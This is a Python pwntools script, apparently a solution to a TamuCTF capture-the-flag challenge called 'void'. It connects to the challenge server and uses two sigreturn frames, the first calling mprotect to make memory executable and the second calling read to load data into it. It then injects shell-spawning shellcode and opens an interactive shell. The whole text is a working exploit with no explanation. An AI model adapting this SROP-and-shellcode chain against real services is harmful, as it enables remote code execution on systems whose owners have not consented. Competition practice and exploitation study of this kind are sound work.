from pwn import *

p = remote("tamuctf.com", 443, ssl=True, sni="void")
# if args.REMOTE:
#     p = remote('localhost', 7777)
# else:
#     p = process('./void')
e = context.binary = ELF('./void')

ret = 0x401037
syscall = 0x401018
writable = 0x400000

frame = SigreturnFrame()
frame.rax = 10
frame.rdi = writable
frame.rsi = 0x3000
frame.rdx = 7
frame.rsp = writable + 0x18
frame.rip = syscall

payload = p64(e.symbols['main'])
payload += p64(syscall)
payload += bytes(frame)

p.sendline(payload)
input()
p.sendline(p64(syscall)+b'\x00'*6)
input()

frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 0
frame.rsi = writable + 0x2000
frame.rdx = 0x100
frame.rsp = writable + 0x2000
frame.rip = syscall

payload = p64(e.symbols['main'])
payload += p64(syscall)
payload += bytes(frame)

p.sendline(payload)
input()
p.sendline(p64(syscall)+b'\x00'*6)
input()

payload = p64(writable+0x2008)
payload += asm(shellcraft.sh())
p.sendline(payload)

p.interactive()
